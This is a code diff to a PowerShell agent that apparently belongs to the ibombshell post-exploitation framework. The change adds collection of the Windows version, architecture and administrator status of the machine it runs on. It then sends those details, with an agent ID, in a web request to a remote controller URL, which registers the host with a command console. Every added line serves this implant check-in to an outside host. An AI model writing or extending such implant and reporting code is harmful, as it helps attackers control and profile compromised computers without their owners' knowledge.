@@ -57,11 +57,18 @@ function console{
         {
             $id = generateid
         }
+
+        ## Getting system info
         if (isadmin){
             $admin = "admin"
         }else {
             $admin = "no"
         }
+
+        $info = Get-CimInstance -ClassName Win32_OperatingSystem
+        $os_version = $info.caption | Out-String
+        $os_arch = $info.OSArchitecture | Out-String
+
         #i am new warrior
         if($uriConsole.Length -ne 0)
         {
@@ -70,7 +77,7 @@ function console{
             {
                 try 
                 {
-                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id/$admin"
+                    $req = iwr -UseBasicParsing -Uri "$uriConsole/newibombshell/$id/$admin/$os_version/$os_arch"
                     #iwr -UseBasicParsing -Method POST -Uri "$uriConsole/ibombshell/$id" -Body @{results=$admin}
                     break
                 }
